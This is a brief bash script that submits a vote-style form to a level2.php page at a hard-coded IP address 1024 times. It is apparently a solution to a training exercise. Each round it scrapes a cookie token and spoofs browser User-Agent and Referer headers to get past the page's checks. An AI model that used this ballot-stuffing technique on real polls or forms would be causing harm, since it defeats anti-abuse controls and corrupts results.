#!/bin/bash
for i in `seq 1 1024`
do
	curl -c ./tmpCook.txt -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" http://158.69.76.135/level2.php > /dev/null
	val=$(cat tmpCook.txt | tail -1 | cut  -f7- | tr -d "\n")
	val='id=1&holdthedoor=Submit+Query&key='$val
	echo $val | tr -d "\n" > key
	curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d @key -b ./tmpCook.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" -e "http://158.69.76.135/level2.php" http://158.69.76.135/level2.php
done
